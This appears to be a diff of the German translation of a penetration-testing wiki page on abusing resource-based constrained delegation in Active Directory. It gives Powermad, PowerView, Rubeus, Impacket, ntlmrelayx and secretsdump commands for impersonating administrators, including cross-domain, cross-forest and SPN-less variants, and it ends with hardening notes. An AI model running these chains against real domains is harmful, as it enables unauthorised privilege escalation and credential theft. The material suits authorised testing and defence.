@@ -3,34 +3,36 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## Grundlagen der Resource-based Constrained Delegation
+## Grundlagen von Resource-based Constrained Delegation
 
-Dies ähnelt der grundlegenden [Constrained Delegation](constrained-delegation.md), aber **anstatt** einem **Objekt** Berechtigungen zu geben, **sich als beliebiger Benutzer gegenüber einem Computer auszugeben**, **legt** die Resource-based Constrained Delegation **im Objekt fest, wer sich als beliebiger Benutzer gegenüber ihm ausgeben darf**.<sup>[[12]](#references)</sup>
+Resource-based constrained delegation (RBCD) ähnelt [constrained delegation](constrained-delegation.md), aber die Vertrauensrichtung ist umgekehrt. Bei der herkömmlichen constrained delegation wird festgelegt, an welche Services ein Principal delegieren darf; RBCD legt auf der **Zielressource** fest, welche Principals Benutzer gegenüber dieser Ressource impersonieren dürfen.<sup>[[12]](#references)</sup>
 
-In diesem Fall verfügt das eingeschränkte Objekt über ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_, das den Namen des Benutzers enthält, der sich gegenüber ihm als jeder andere Benutzer ausgeben kann.
+Das Attribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ des Zielobjekts enthält einen Sicherheitsdeskriptor, der die Principals identifiziert, die berechtigt sind, gegenüber dieser Ressource im Namen anderer Identitäten zu handeln.
 
-Ein weiterer wichtiger Unterschied dieser Constrained Delegation zu den anderen Delegationsarten besteht darin, dass jeder Benutzer mit **Schreibberechtigungen über ein Computerkonto** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) **_msDS-AllowedToActOnBehalfOfOtherIdentity_** festlegen kann (bei den anderen Formen der Delegation benötigte man Domain-Admin-Rechte).<sup>[[1]](#references)</sup>
+Ein weiterer wichtiger Unterschied besteht darin, dass ein Principal mit ausreichenden **Schreibberechtigungen über ein Computerkonto** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` und ähnliche Rechte) möglicherweise _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ setzen kann. Das Konfigurieren der herkömmlichen constrained delegation erfordert normalerweise privilegierteren administrativen Zugriff.<sup>[[1]](#references)</sup>
+
+Genauer gesagt wird das Ändern der Einstellungen für die klassische constrained delegation normalerweise durch `SeEnableDelegationPrivilege` auf einem Domain Controller eingeschränkt. Dieses Recht besitzen typischerweise hochprivilegierte Administratoren. RBCD verlagert die Entscheidung auf den Sicherheitsdeskriptor des Zielobjekts, sodass Schreibzugriff auf die relevante Eigenschaft des Computerobjekts ohne dieses Benutzerrecht ausreichen kann.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ### Neue Konzepte
 
-Bei der Constrained Delegation wurde erklärt, dass das **`TrustedToAuthForDelegation`**-Flag innerhalb des _userAccountControl_-Werts des Benutzers erforderlich ist, um ein **S4U2Self** durchzuführen. Das ist jedoch nicht vollständig korrekt.\
-Tatsächlich kann man auch ohne diesen Wert ein **S4U2Self** gegenüber jedem Benutzer durchführen, wenn man ein **Service** ist (über einen SPN verfügt). Wenn man jedoch **`TrustedToAuthForDelegation`** besitzt, ist das zurückgegebene TGS **Forwardable**, und wenn man dieses Flag **nicht besitzt**, ist das zurückgegebene TGS **nicht Forwardable**.<sup>[[5]](#references)</sup>
+Das Flag **`TrustedToAuthForDelegation`** in `userAccountControl` wird oft als Voraussetzung für **S4U2Self** beschrieben, was jedoch unvollständig ist.\
+Ein Service Principal mit einem SPN kann S4U2Self auch ohne dieses Flag anfordern. Mit `TrustedToAuthForDelegation` ist das zurückgegebene Service-Ticket **forwardable**; ohne dieses Flag ist das Ticket normalerweise **non-forwardable**.<sup>[[5]](#references)</sup>
 
-Wenn das bei **S4U2Proxy** verwendete **TGS** jedoch **nicht Forwardable** ist, funktioniert der Versuch, eine **grundlegende Constrained Delegation** zu missbrauchen, **nicht**. Wenn man jedoch versucht, eine Resource-based Constrained Delegation auszunutzen, wird es funktionieren.<sup>[[1]](#references)[[2]](#references)</sup>
+Die herkömmliche constrained delegation lehnt ein **non-forwardable TGS** im S4U2Proxy-Schritt ab. RBCD kann dieses S4U2Self-Ticket akzeptieren, wenn der Sicherheitsdeskriptor des Ziels den anfragenden Service autorisiert.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>
 
-### Angriffsstruktur
+### Struktur des Angriffs
 
-> Wenn du **Schreibäquivalenzberechtigungen** über ein **Computer**-Konto hast, kannst du **privilegierten Zugriff** auf diesem Computer erlangen.
+> Wenn du **Schreibrechte-äquivalente Berechtigungen** über ein **Computerkonto** hast, kannst du möglicherweise privilegierten Zugriff auf diese Maschine erlangen.
 
-Angenommen, der Angreifer verfügt bereits über **Schreibäquivalenzberechtigungen über den betroffenen Computer**.
+Angenommen, der Angreifer verfügt bereits über **Schreibrechte-äquivalente Berechtigungen über das Computerobjekt des Opfers**.
 
-1. Der Angreifer **kompromittiert** ein Konto, das über einen **SPN** verfügt, oder **erstellt eines** („Service A“). Beachte, dass jeder _Admin User_ ohne weitere spezielle Berechtigungen bis zu 10 Computerobjekte (**_MachineAccountQuota_**) **erstellen** und ihnen einen **SPN** zuweisen kann. Der Angreifer kann daher einfach ein Computerobjekt erstellen und ihm einen SPN zuweisen.
-2. Der Angreifer **missbraucht seine WRITE-Berechtigung** über den betroffenen Computer (ServiceB), um eine **Resource-based constrained delegation** zu konfigurieren, die ServiceA erlaubt, sich gegenüber diesem betroffenen Computer (ServiceB) als beliebiger Benutzer auszugeben.
+1. Der Angreifer **kompromittiert** ein Konto mit einem **SPN** oder **erstellt eines** ("Service A"). Standardmäßig kann ein authentifizierter Domain-Benutzer bis zu 10 Computerobjekte erstellen, gesteuert durch **_MachineAccountQuota_**; ein Computerobjekt stellt automatisch verwendbare SPNs bereit.
+2. Der Angreifer **missbraucht seine WRITE-Berechtigung** über den Computer des Opfers (ServiceB), um resource-based constrained delegation so zu konfigurieren, dass ServiceA jeden Benutzer gegenüber diesem Computer des Opfers (ServiceB) impersonieren darf.
 3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Service A zu Service B für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
-1. S4U2Self (vom kompromittierten/erstellten Konto mit dem SPN): Fordere ein **TGS von Administrator zu mir** an (nicht Forwardable).
-2. S4U2Proxy: Verwende das **nicht Forwardable TGS** aus dem vorherigen Schritt, um ein **TGS** von **Administrator** für den **betroffenen Host** anzufordern.
-3. Auch wenn du ein nicht Forwardable TGS verwendest, wird es funktionieren, da du eine Resource-based Constrained Delegation ausnutzt.
-4. Der Angreifer kann **Pass-the-Ticket** verwenden und sich als der Benutzer **ausgeben**, um **Zugriff auf den betroffenen ServiceB** zu erlangen.<sup>[[1]](#references)</sup>
+1. S4U2Self (vom kompromittierten oder erstellten SPN-Konto): Ein **TGS, der Administrator gegenüber Service A repräsentiert**, anfordern (non-forwardable).
+2. S4U2Proxy: Dieses **non-forwardable TGS** verwenden, um ein Service-Ticket anzufordern, das **Administrator** gegenüber dem **Host des Opfers** repräsentiert.
+3. Das non-forwardable Ticket kann in diesem RBCD-Ablauf trotzdem funktionieren, da Service A im Sicherheitsdeskriptor der Zielressource autorisiert ist.
+4. Der Angreifer kann **pass-the-ticket** durchführen und den Benutzer **impersonieren**, um **Zugriff auf den Opfer-ServiceB** zu erlangen.<sup>[[1]](#references)</sup>
 
 Um die _**MachineAccountQuota**_ der Domain zu überprüfen, kannst du Folgendes verwenden:
 ```bash
@@ -40,7 +42,7 @@ Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select Ma
 
 ### Erstellen eines Computerobjekts
 
-Sie können mithilfe von **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> ein Computerobjekt innerhalb der Domäne erstellen.
+Du kannst ein Computerobjekt innerhalb der Domäne mit **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> erstellen.
 ```bash
 import-module powermad
 New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
@@ -48,14 +50,14 @@ New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '
 # Check if created
 Get-DomainComputer SERVICEA
 ```
-### Konfigurieren der ressourcenbasierten eingeschränkten Delegation
+### Konfigurieren von Resource-based Constrained Delegation
 
-**Verwendung des activedirectory PowerShell-Moduls**<sup>[[4]](#references)</sup>
+**Verwendung des Active Directory PowerShell-Moduls**<sup>[[4]](#references)</sup>
 ```bash
-Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
 Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
 ```
-**Mit powerview**<sup>[[3]](#references)</sup>
+**Verwendung von powerview**<sup>[[3]](#references)</sup>
 ```bash
 $ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
 $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
@@ -70,7 +72,7 @@ msds-allowedtoactonbehalfofotheridentity
 ----------------------------------------
 {1, 0, 4, 128...}
 ```
-### Durchführen eines vollständigen S4U-Angriffs (Windows/Rubeus)
+### Durchführung eines vollständigen S4U attack (Windows/Rubeus)
 
 Zunächst haben wir das neue Computer-Objekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:<sup>[[3]](#references)[[4]](#references)</sup>
 ```bash
@@ -81,14 +83,14 @@ Nun kann der Angriff durchgeführt werden:<sup>[[3]](#references)[[4]](#referenc
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
 ```
-Sie können weitere Tickets für weitere Services generieren, indem Sie mit dem `/altservice`-Parameter von Rubeus nur einmal fragen:
+Sie können weitere Tickets für zusätzliche Services generieren, indem Sie den `/altservice`-Parameter von Rubeus nur einmal angeben:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
 ```
 > [!CAUTION]
-> Beachte, dass Benutzer ein Attribut namens "**Cannot be delegated**" haben. Wenn dieses Attribut bei einem Benutzer auf True gesetzt ist, kannst du dich nicht als dieser Benutzer ausgeben. Diese Eigenschaft ist in BloodHound sichtbar.
+> Benutzer können als **„Konto ist vertraulich und kann nicht delegiert werden.“** markiert werden. Wenn dieses Flag aktiviert ist, kann das Konto über diesen Delegation-Flow nicht impersonated werden. BloodHound zeigt diese Eigenschaft während der Analyse an.
 
-### Linux tooling: vollständiges RBCD mit Impacket (2024+)
+### Linux-Tools: End-to-End-RBCD mit Impacket (2024+)
 
 Wenn du von Linux aus arbeitest, kannst du die vollständige RBCD-Kette mit den offiziellen Impacket-Tools durchführen:<sup>[[6]](#references)[[7]](#references)</sup>
 ```bash
@@ -109,18 +111,18 @@ impacket-secretsdump -k -no-pass Administrator@victim.domain.local
 ```
 Hinweise
 - Wenn LDAP signing/LDAPS erzwungen wird, verwende `impacket-rbcd -use-ldaps ...`.
-- Bevorzuge AES keys; viele moderne Domains schränken RC4 ein. Impacket und Rubeus unterstützen beide AES-only flows.
+- Bevorzuge AES-Schlüssel; viele moderne Domänen schränken RC4 ein. Impacket und Rubeus unterstützen beide AES-only-Flows.
 - Impacket kann für einige Tools den `sname` ("AnySPN") umschreiben, aber ermittle nach Möglichkeit den korrekten SPN (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).
 
-## Domainübergreifendes und forestübergreifendes RBCD
+## Cross-domain & cross-forest RBCD
 
-Wenn der **delegating principal**, den du kontrollierst, in einer **anderen Domain** (oder sogar einem **anderen forest**) als der **resource computer** liegt, handelt es sich weiterhin um **RBCD**, aber der Ticket flow entspricht nicht mehr dem üblichen Single-Domain-Ablauf `S4U2Self -> S4U2Proxy`.
+Wenn der **delegierende Principal**, den du kontrollierst, in einer **anderen Domäne** (oder sogar einer **anderen Forest**) als der **Ressourcencomputer** liegt, handelt es sich weiterhin um **RBCD**, aber der Ticket-Flow ist nicht mehr der übliche `S4U2Self -> S4U2Proxy` innerhalb einer einzelnen Domäne.
 
-### Domainübergreifendes RBCD: den foreign principal per SID konfigurieren
+### Cross-domain RBCD: den fremden Principal per SID konfigurieren
 
-Wenn du `msDS-AllowedToActOnBehalfOfOtherIdentity` aus einer **anderen Domain** setzt, ist der foreign machine/user im LDAP der Zieldomain möglicherweise **nicht per Name auflösbar**. Konfiguriere in diesem Fall den Delegationseintrag anhand der **SID** des foreign principal anstelle seines sAMAccountName/UPN.
+Wenn du `msDS-AllowedToActOnBehalfOfOtherIdentity` aus einer **anderen Domäne** setzt, kann der fremde Computer/Benutzer im LDAP der Zieldomäne möglicherweise **nicht per Namen aufgelöst werden**. Konfiguriere in diesem Fall den Delegation-Eintrag mithilfe der **SID** des fremden Principals anstelle seines sAMAccountName/UPN.
 
-Dies ist besonders relevant, wenn du NTLM per `ntlmrelayx.py` an LDAP relayst:<sup>[[9]](#references)</sup>
+Dies ist besonders relevant, wenn du NTLM an LDAP mit `ntlmrelayx.py` relayst:<sup>[[9]](#references)</sup>
 ```bash
 sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
 --no-dump --no-da --no-validate-privs \
@@ -128,28 +130,28 @@ sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
 --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
 --sid
 ```
-Hinweise:
-- `--sid` weist `ntlmrelayx.py` an, `--escalate-user` als SID zu behandeln. Dies ist erforderlich, wenn das delegierende Konto aus einer anderen Domäne als der Zieldomäne stammt.
-- Selbst wenn das Tool `User not found in LDAP` ausgibt, kann der Delegation-Schreibvorgang erfolgreich sein, da der Security Descriptor die fremde SID direkt speichert.
+Notizen:
+- `--sid` weist `ntlmrelayx.py` an, `--escalate-user` als SID zu behandeln. Dies ist erforderlich, wenn das delegierende Konto aus einer anderen Domain als der Zieldomain stammt.
+- Selbst wenn das Tool `User not found in LDAP` ausgibt, kann der Delegation-Write erfolgreich sein, da der Security Descriptor die fremde SID direkt speichert.
 
-### Domänenübergreifendes RBCD: Cross-Realm-S4U-Sequenz
+### Cross-domain RBCD: Cross-realm-S4U-Sequenz
 
-Sobald der fremde Principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` eingetragen ist, sieht der funktionierende domänenübergreifende Ablauf folgendermaßen aus:<sup>[[9]](#references)[[13]](#references)</sup>
+Sobald sich der fremde Principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` befindet, ist der funktionierende Cross-domain-Ablauf:<sup>[[9]](#references)[[13]](#references)</sup>
 
-1. Einen **TGT** für den delegierenden Principal aus seiner eigenen Domäne abrufen.
-2. Einen **Referral-TGT** für `krbtgt/<target-domain>` anfordern.
-3. Eine **Cross-Realm-S4U2Self-Referral** für den zu impersonierenden Benutzer beim DC der Zieldomäne anfordern.
-4. Das eigentliche **S4U2Self**-Ticket für diesen Benutzer wieder in der delegierenden Domäne anfordern.
-5. **S4U2Proxy** in der delegierenden Domäne durchführen, um ein Referral-Ticket für die Zieldomäne zu erhalten.
-6. Das abschließende **S4U2Proxy** beim DC der Zieldomäne durchführen, um das Service-Ticket für `cifs/host.target`, `host/host.target` usw. zu erhalten.
+1. Ein **TGT** für den delegierenden Principal aus dessen eigener Domain abrufen.
+2. Ein **Referral-TGT** für `krbtgt/<target-domain>` anfordern.
+3. Einen **Cross-realm-S4U2Self-Referral** für den zu impersonierenden Benutzer beim Domain Controller der Zieldomain anfordern.
+4. Das eigentliche **S4U2Self**-Ticket für diesen Benutzer zurück in der delegierenden Domain anfordern.
+5. **S4U2Proxy** in der delegierenden Domain ausführen, um ein Referral-Ticket für die Zieldomain zu erhalten.
+6. Das abschließende **S4U2Proxy** auf dem Domain Controller der Zieldomain ausführen, um das Service-Ticket für `cifs/host.target`, `host/host.target` usw. zu erhalten.
 
-Aus diesem Grund schlägt gewöhnliches Linux-Tooling bei domänenübergreifendem RBCD häufig fehl:<sup>[[9]](#references)</sup>
-- Der **Realm** der Anfrage muss möglicherweise vom Realm des im `TGS-REQ` verwendeten TGT abweichen.
+Dies ist der Grund, warum Standard-Linux-Tools bei Cross-domain RBCD häufig fehlschlagen:<sup>[[9]](#references)</sup>
+- Der **Realm** der Anfrage muss sich möglicherweise vom Realm des im `TGS-REQ` verwendeten TGT unterscheiden.
 - Die Kette benötigt **unabhängige S4U2Proxy-Schritte**, nicht nur **S4U2Self** oder **S4U2Self**, unmittelbar gefolgt von einem einzelnen **S4U2Proxy**.
 
-### Domänenübergreifendes RBCD unter Linux
+### Cross-domain RBCD unter Linux
 
-Synacktiv veröffentlichte eine Impacket-Implementierung von `getST.py`, die die Cross-Realm-Sequenz unter Linux reproduziert, indem sie die beiden KDCs explizit verarbeitet:<sup>[[9]](#references)[[11]](#references)</sup>
+Synacktiv hat eine Impacket-Implementierung von `getST.py` veröffentlicht, die die Cross-realm-Sequenz unter Linux reproduziert, indem sie die beiden KDCs explizit verarbeitet:<sup>[[9]](#references)[[11]](#references)</sup>
 ```bash
 python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
 -dc-ip 192.168.90.131 \
@@ -162,38 +164,38 @@ KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
 ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
 -k -no-pass -dc-ip 192.168.90.217
 ```
-Operativ lauten die neuen Argumente:
+Die neuen Argumente lauten:
 - `-dc-ip`: DC der **delegierenden** Domain
 - `-targetdomain`: Domain des **Ressourcencomputers**
 - `-targetdc`: DC der **Ressourcen**-Domain
 
 ### Einschränkungen von Cross-forest RBCD
 
-Cross-forest RBCD hat eine wichtige Einschränkung: **Der impersonated user muss derselben Forest wie der delegating principal angehören**. Wenn sich dein kontrolliertes Maschinenkonto also in `valhalla.local` befindet und die Zielressource in `asgard.local`, kannst du im Allgemeinen **keine beliebigen `asgard.local`-Benutzer** über RBCD gegenüber dieser Ressource impersonaten.<sup>[[9]](#references)</sup>
+Cross-forest RBCD hat eine wichtige Einschränkung: **Der impersonifizierte Benutzer muss derselben Forest wie der delegierende Principal angehören**. Wenn sich dein kontrolliertes Maschinenkonto also in `valhalla.local` befindet und die Zielressource in `asgard.local`, kannst du im Allgemeinen **keine beliebigen `asgard.local`-Benutzer** über RBCD für diese Ressource impersonifizieren.<sup>[[9]](#references)</sup>
 
 Es ist weiterhin ausnutzbar, wenn:
-- der Benutzer aus der **delegating forest** ein **local admin** (oder anderweitig privilegiert) auf dem Ressourcenhost in der anderen Forest ist
-- ein Trust den erforderlichen Authentication-Pfad erlaubt und die fremde SID im Security Descriptor des Zielcomputers akzeptiert wird
+- der Benutzer der **delegierenden Forest** ein **local admin** (oder anderweitig privilegiert) auf dem Ressourcenhost in der anderen Forest ist
+- ein Trust den erforderlichen Authentifizierungspfad erlaubt und die fremde SID im Security Descriptor des Zielcomputers akzeptiert wird
 
 ### Protokollbesonderheiten von Cross-forest RBCD
 
-Cross-forest RBCD ist nicht einfach nur „cross-domain plus ein Trust“. Der beobachtete Ablauf umfasst zwei Besonderheiten, die gängige Tools historisch übersehen:<sup>[[9]](#references)</sup>
+Cross-forest RBCD ist nicht einfach nur „Cross-domain plus ein Trust“. Der beobachtete Ablauf umfasst zwei Besonderheiten, die von gängigen Tools historisch übersehen werden:<sup>[[9]](#references)</sup>
 
 1. Eine zusätzliche **S4U2Proxy**-Anfrage, die **`PA-PAC-OPTIONS=branch-aware`** setzt
-2. Ein finales Service Ticket, das möglicherweise über **RC4** zurückgegeben wird, selbst wenn andere Etypes angefordert wurden
+2. Ein finales Service-Ticket, das möglicherweise über **RC4** zurückgegeben wird, selbst wenn andere Etypes angefordert wurden
 
 Der praktische Ablauf ist:
 
-1. Einen TGT für den delegating principal in Forest A beschaffen.
-2. **S4U2Self** für den impersonated user in Forest A anfordern.
+1. Ein TGT für den delegierenden Principal in Forest A abrufen.
+2. **S4U2Self** für den zu impersonifizierenden Benutzer in Forest A anfordern.
 3. **S4U2Proxy** in Forest A anfordern, um ein Referral-TGT für Forest B zu erhalten.
 4. Ein zweites **S4U2Proxy** in Forest A **ohne das S4U2Self-Ticket als zusätzliches Ticket**, aber mit aktiviertem `branch-aware`, senden, um ein weiteres Referral-TGT für Forest B zu erhalten.
-5. Optional ein normales Service Ticket in Forest B für den delegating principal anfordern (dieses Ticket wird für den finalen Abuse nicht benötigt).
-6. Die Referral-Tickets aus den Schritten 3 und 4 verwenden, um das finale **S4U2Proxy**-Ticket in Forest B für den impersonated forest-A user gegenüber dem Ziel-SPN anzufordern.
+5. Optional ein normales Service-Ticket in Forest B für den delegierenden Principal anfordern (dieses Ticket ist für den finalen Abuse nicht erforderlich).
+6. Die Referral-Tickets aus den Schritten 3 und 4 verwenden, um das finale **S4U2Proxy**-Ticket in Forest B für den zu impersonifizierenden Forest-A-Benutzer beim Ziel-SPN anzufordern.
 
-### Cross-forest RBCD von Linux aus
+### Cross-forest RBCD von Linux
 
-Der gleiche Synacktiv-Impacket-Branch ergänzt für diese Logik einen `-forest`-Switch:<sup>[[9]](#references)[[11]](#references)</sup>
+Der gleiche Synacktiv-Impacket-Branch fügt für diese Logik einen `-forest`-Switch hinzu:<sup>[[9]](#references)[[11]](#references)</sup>
 ```bash
 python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
 -impersonate 'v_thor' \
@@ -204,13 +206,13 @@ valhalla.local/'desktop$' \
 -aesKey 4[...]f \
 -forest
 ```
-### Rekursives domänenübergreifendes RBCD (3+ Domänen)
+### Rekursives Multi-Domain-RBCD (3+ Domains)
 
-In **Forests mit mehreren Domänen** können sowohl **S4U2Self** als auch **S4U2Proxy** **rekursiv** sein, anstatt nach einer Weiterleitung zu stoppen:
+In **Multi-Domain-Forests** können sowohl **S4U2Self** als auch **S4U2Proxy** **rekursiv** sein, anstatt nach einer Weiterleitung zu stoppen:
 
-- **Rekursives S4U2Self**: Das erste `S4U2Self` wird an die **Domäne des impersonierten Benutzers** gesendet, die Zwischenwechsel zwischen übergeordneten und untergeordneten Domänen werden mit normalen `TGS-REQ`-Weiterleitungen für `krbtgt/<REALM>` durchlaufen, und das **abschließende `S4U2Self`** wird in der **eigenen Domäne des delegierenden Principals** gesendet.
-- Das bedeutet, dass bereits das **Besitzen eines TGTs** für ein Computerkonto ausreichen kann, um sich als **Administrator aus einer anderen Domäne im selben Forest** auszugeben und `cifs/host`, `host/host`, `wsman/host` usw. anzufordern.
-- **Rekursives S4U2Proxy** folgt der Trust-Kette auf dieselbe Weise: Zwischenwechsel verwenden das vorherige Ticket erneut als TGT, während die nächste `krbtgt/<REALM>`-Weiterleitung angefordert wird. Erst der letzte Wechsel gibt das abschließende Service-Ticket zurück.<sup>[[10]](#references)</sup>
+- **Rekursives S4U2Self**: Das erste `S4U2Self` wird an die **Domain des impersonierten Benutzers** gesendet. Dazwischenliegende Parent-/Child-Hops werden mit normalen `TGS-REQ`-Weiterleitungen für `krbtgt/<REALM>` durchlaufen, und das **abschließende `S4U2Self`** wird in der eigenen Domain des **delegierenden Principals** gesendet.
+- Das bedeutet, dass bereits der **Besitz eines TGTs** für ein Maschinenkonto ausreichen kann, um sich als **Admin aus einer anderen Domain desselben Forests** auszugeben und `cifs/host`, `host/host`, `wsman/host` usw. anzufordern.
+- **Rekursives S4U2Proxy** folgt der Vertrauenskette auf dieselbe Weise: Bei Zwischen-Hops wird das vorherige Ticket wieder als TGT verwendet, während die nächste `krbtgt/<REALM>`-Weiterleitung angefordert wird. Nur der letzte Hop gibt das finale Service-Ticket zurück.<sup>[[10]](#references)</sup>
 
 Ein praktisches Beispiel innerhalb desselben Forests ist:
 ```bash
@@ -221,16 +223,16 @@ KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO
 KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
 smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
 ```
-### SPN-less cross-domain / cross-forest RBCD
+### SPN-less domainübergreifendes / forestübergreifendes RBCD
 
-Wenn der **delegating principal ein Benutzer ohne SPN** ist, schlägt das letzte rekursive `S4U2Self` mit **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** fehl. Der Workaround besteht darin, **nur den letzten Hop als `S4U2Self+U2U`** zu wiederholen.<sup>[[10]](#references)</sup>
+Wenn der **delegierende Principal ein Benutzer ohne SPN** ist, schlägt der letzte rekursive `S4U2Self` mit **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** fehl. Der Workaround besteht darin, **nur den letzten Hop als `S4U2Self+U2U`** erneut auszuführen.<sup>[[10]](#references)</sup>
 
 Kurzfassung der Abuse-Kette:
 
-1. Mit dem **NT hash** authentifizieren, damit der KDC zu **RC4-HMAC (etype 23)** gedrängt wird.
+1. Mit dem **NT-Hash** authentifizieren, damit der KDC in Richtung **RC4-HMAC (Etype 23)** gelenkt wird.
 2. Zuerst **`-self -u2u`** anfordern und dieses Ticket getrennt vom späteren Proxy-Schritt aufbewahren.
-3. Den **TGT session key** mit `describeTicket.py` extrahieren.
-4. Den **NT hash** des Benutzers mit diesem **session key** über `changepasswd.py -newhashes <session_key>` ersetzen.
+3. Den **TGT-Session-Key** mit `describeTicket.py` extrahieren.
+4. Den **NT-Hash** des Benutzers mit diesem **Session-Key** unter Verwendung von `changepasswd.py -newhashes <session_key>` ersetzen.
 5. Das `S4U2Self+U2U`-Ticket bei einer separaten **`-proxy`**-Anfrage erneut als **`-additional-ticket`** verwenden.
 ```bash
 getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
@@ -244,33 +246,33 @@ KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-
 ```
 Betriebliche Hinweise:
 
-- Wenn der **erste vertrauenswürdige Hop bereits eine andere Forest ist**, sollte der **branch-aware** Algorithmus (`getST.py ... -forest`) bevorzugt werden, um das native Verhalten von Windows abzubilden. Wenn die fremde Forest erst **später** in der Kette erreicht wird, kann der rekursive Flow ohne Branch-Erkennung weiterhin funktionieren.<sup>[[9]](#references)</sup>
-- Auf aktuellen **Windows Server 2022/2025**-DCs kann erzwungenes RC4 aufgrund der veralteten RC4-Unterstützung mit **`KDC_ERR_ETYPE_NOSUPP`** fehlschlagen. Dadurch kann **SPN-less RBCD** unmöglich werden, obwohl klassisches SPN-basiertes RBCD weiterhin mit AES funktioniert.<sup>[[15]](#references)</sup>
-- Führe **`S4U2Self+U2U` vor dem Ändern des Hashes/Passworts des Benutzers** aus: `SamrChangePasswordUser` berechnet die Kerberos-AES-Keys des Kontos **nicht** neu. Wird das Passwort zuerst geändert, können spätere Ticket-Anfragen fehlschlagen.<sup>[[14]](#references)</sup>
-- Das impersonierte Konto muss weiterhin **delegable** sein: **Protected Users** sowie Konten mit **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** blockieren die Kette.
+- Wenn der **erste vertrauenswürdige Hop bereits eine andere Forest ist**, sollte der **branch-aware**-Algorithmus (`getST.py ... -forest`) verwendet werden, um das native Verhalten von Windows nachzubilden. Wenn die fremde Forest erst **später** in der Kette erreicht wird, kann der nicht branch-aware rekursive Ablauf weiterhin funktionieren.<sup>[[9]](#references)</sup>
+- Auf aktuellen **Windows Server 2022/2025**-DCs kann erzwungenes RC4 mit **`KDC_ERR_ETYPE_NOSUPP`** fehlschlagen, da RC4 veraltet ist. Dadurch kann **SPN-less RBCD** unmöglich werden, obwohl klassisches SPN-basiertes RBCD weiterhin mit AES funktioniert.<sup>[[15]](#references)</sup>
+- Führe **`S4U2Self+U2U` vor der Änderung des Hashes/Passworts des Benutzers** aus: `SamrChangePasswordUser` berechnet die Kerberos-AES-Schlüssel des Kontos **nicht** neu. Wenn die Passwortänderung zuerst erfolgt, können spätere Ticket-Anfragen fehlschlagen.<sup>[[14]](#references)</sup>
+- Das impersonifizierte Konto muss weiterhin **delegierbar** sein: **Protected Users** sowie Konten mit **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** blockieren die Kette.
 
-## Hinweise zur Erkennung / Hardening
+## Hinweise zur Erkennung / Härtung
 
-- RBCD-Pfade über Domains/Forests hinweg werden weiterhin meist durch **ACL abuse** oder **relay-to-LDAP** erstellt. Erzwinge **LDAP signing** und **LDAP channel binding** auf DCs, um gängige Setup-Pfade zu unterbrechen.
-- Prüfe, wer `msDS-AllowedToActOnBehalfOfOtherIdentity` für Computerobjekte schreiben kann, und löse die gespeicherten SIDs auf, einschließlich **foreign security principals**.
-- Prüfe in Umgebungen mit vielen Trusts **Selective Authentication**, **SID filtering** und ob Benutzer aus einer fremden Forest über **local admin**-Rechte auf Ressourcenhosts verfügen.
+- RBCD-Pfade über Domains/Forests hinweg werden weiterhin üblicherweise durch **ACL-Missbrauch** oder **relay-to-LDAP** erstellt. Erzwinge **LDAP signing** und **LDAP channel binding** auf DCs, um gängige Setup-Pfade zu unterbrechen.
+- Überwache, wer `msDS-AllowedToActOnBehalfOfOtherIdentity` auf Computerobjekten schreiben kann, und löse die gespeicherten SIDs auf, einschließlich **foreign security principals**.
